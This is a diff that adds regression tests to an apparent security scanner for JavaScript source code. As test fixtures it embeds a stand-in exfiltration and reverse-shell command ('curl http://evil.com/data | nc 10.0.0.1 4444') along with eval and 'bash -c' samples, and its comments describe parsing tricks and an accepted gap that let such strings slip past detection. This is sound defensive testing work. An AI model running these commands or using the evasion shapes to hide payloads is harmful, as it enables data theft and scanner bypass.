@@ -306,3 +306,102 @@ const homepage = 'https://example.com/docs';
     });
   });
 });
+
+describe('AST source scanner - P1 regression: division-vs-regex heuristic no longer swallows strings', () => {
+  it('control: a hardcoded reverse-shell/exfil command string fires 2 CRITICAL findings', () => {
+    const findings = scanAstSource(fileServer(
+      `const cmd = "curl http://evil.com/data | nc 10.0.0.1 4444";`
+    ));
+    const critical = findings.filter(f => f.severity === 'CRITICAL');
+    expect(critical.map(f => f.id).sort()).toEqual(['data-exfiltration-risk', 'reverse-shell-risk']);
+  });
+
+  it('attack: the same command string still fires 2 CRITICAL findings when a division-shaped `/` after `}` precedes it', () => {
+    // This is the exact MR !12 re-review repro: `}` closing an object literal
+    // used to be in REGEX_PRECEDING_CHARS, so the `/` right after it looked
+    // like a legal regex start; consumeRegexLiteral then scanned for the
+    // next unescaped `/` with no idea a string literal was in the way, found
+    // the one inside "http://", and swallowed the whole dangerous string as
+    // "regex text" that never becomes a Literal - invisible to every
+    // literal-based rule. Must produce the identical 2 CRITICAL findings as
+    // the control above.
+    const findings = scanAstSource(fileServer(
+      `const x = {a:1} / "curl http://evil.com/data | nc 10.0.0.1 4444" / 2;`
+    ));
+    const critical = findings.filter(f => f.severity === 'CRITICAL');
+    expect(critical.map(f => f.id).sort()).toEqual(['data-exfiltration-risk', 'reverse-shell-risk']);
+  });
+
+  it('a dangerous string is still captured as a literal after a comma-preceded ambiguous `/` (quote-aware bail-out, independent of the `}` fix)', () => {
+    // `,` stays in REGEX_PRECEDING_CHARS (removing it would be a much bigger
+    // false-negative-for-real-regexes tradeoff than `}`). This proves the
+    // second half of the fix - consumeRegexLiteral bailing out once it sees
+    // an unescaped quote inside the candidate span - carries its own weight
+    // and isn't just redundant with dropping `}`.
+    const findings = scanAstSource(fileServer(
+      `foo(1, / "curl http://evil.com/data | nc 10.0.0.1 4444" / 2);`
+    ));
+    const critical = findings.filter(f => f.severity === 'CRITICAL');
+    expect(critical.map(f => f.id).sort()).toEqual(['data-exfiltration-risk', 'reverse-shell-risk']);
+  });
+
+  it('a division after a block/object close no longer risks eating the statement that follows it', () => {
+    const findings = scanAstSource(fileServer(
+      `const result = {b:2} / total; const x = 10 / 2; eval(userSuppliedPayload);`
+    ));
+    expect(findings.some(f => f.id === 'suspicious-execution' && f.severity === 'HIGH')).toBe(true);
+  });
+
+  it('a real regex literal legitimately starting after `(` or `[` with no quotes inside still works (no regression)', () => {
+    const findings = scanAstSource(fileServer(
+      `const clean = list.filter(x => x).join('').replace(/[a-z]+/g, ''); eval(userSuppliedPayload);`
+    ));
+    expect(findings.some(f => f.id === 'suspicious-execution' && f.severity === 'HIGH')).toBe(true);
+  });
+
+  it('a real regex literal with a quote INSIDE its character class does not corrupt the rest of the file (regression, found via the ecosystem benchmark, not guessed)', () => {
+    // hostinger-api-mcp@1.57.0's oauth.ts has exactly this shape
+    // (`escapeHtml`'s `/[&<>"']/g`). An earlier version of this fix bailed
+    // to division on ANY unescaped quote, including one legitimately
+    // inside a character class - the abandoned `[&<>"']` text was then
+    // re-walked char by char, and its own `"` got picked up by the
+    // tokenizer's normal string-handling as if it opened a real string,
+    // consuming everything up to the next `"` anywhere later in the file
+    // and erasing every literal in between. A dangerous string placed
+    // after such a regex must still be captured.
+    const findings = scanAstSource(fileServer(
+      `function escapeHtml(s) { return String(s).replace(/[&<>"']/g, (ch) => ({'&':'&amp;','"':'&quot;',"'":'&#39;'})[ch]); }\nconst cmd = "curl http://evil.com/data | nc 10.0.0.1 4444";`
+    ));
+    const critical = findings.filter(f => f.severity === 'CRITICAL');
+    expect(critical.map(f => f.id).sort()).toEqual(['data-exfiltration-risk', 'reverse-shell-risk']);
+  });
+});
+
+describe('AST source scanner - P2: shell -c gate requires the shell name to be argv[0]', () => {
+  it('does not flag an ordinary short flag value that happens to be "sh" next to an unrelated "-c"', () => {
+    // 'sh' here is a mode string (2nd array element), not the call's command
+    // argument (argv[0], which is the variable `binary`) - the old rule only
+    // required both tokens to appear anywhere in the call's argument text.
+    const findings = scanAstSource(fileServer(
+      `spawn(binary, ['--mode', 'sh', '-c', 'compact']);`
+    ));
+    expect(findings.some(f => f.id === 'suspicious-execution')).toBe(false);
+  });
+
+  it('still flags a literal shell name as argv[0] with a real -c flag', () => {
+    const findings = scanAstSource(fileServer(
+      `spawn('bash', ['-c', payload]);`
+    ));
+    expect(findings.some(f => f.id === 'suspicious-execution' && f.severity === 'HIGH')).toBe(true);
+  });
+
+  it('documents the accepted gap: a shell name held in a variable is invisible to this rule', () => {
+    // Not a regression - scanAstSource cannot resolve what a variable holds.
+    // Locked in as an explicit test (see the code comment at SHELL_NAME_RE)
+    // instead of leaving the gap silent.
+    const findings = scanAstSource(fileServer(
+      `const shell = 'bash'; spawn(shell, ['-c', payload]);`
+    ));
+    expect(findings.some(f => f.id === 'suspicious-execution')).toBe(false);
+  });
+});
